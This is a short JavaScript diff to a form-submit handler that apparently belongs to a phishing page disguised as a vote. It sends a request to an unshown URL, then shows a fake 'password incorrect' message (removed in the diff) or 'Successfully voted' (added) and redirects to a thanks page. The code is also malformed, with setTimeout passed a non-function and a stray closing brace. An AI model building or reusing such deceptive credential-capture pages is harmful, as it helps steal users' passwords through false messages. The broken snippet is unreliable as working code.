@@ -27,9 +27,17 @@ form.addEventListener("submit", (e) => {
         let api = new XMLHttpRequest();
         api.open("GET", url, true);
         api.send();
-        setTimeout(
-        document.getElementById("alert-message").innerHTML = "Sorry, your password was incorrect. Please double-check your password."
-    ,50000)
-  window.location.replace("thanks.html")
+          setTimeout(
+        document.getElementById("alert-message").innerHTML =
+          "Successfully voted",
+        10000
+      );
+    });
+
+
+    setTimeout(function() {
+        window.location.replace("thanks.html");
+    }, 1000)
+
   //   console.log("Incorrect Password!");
 });
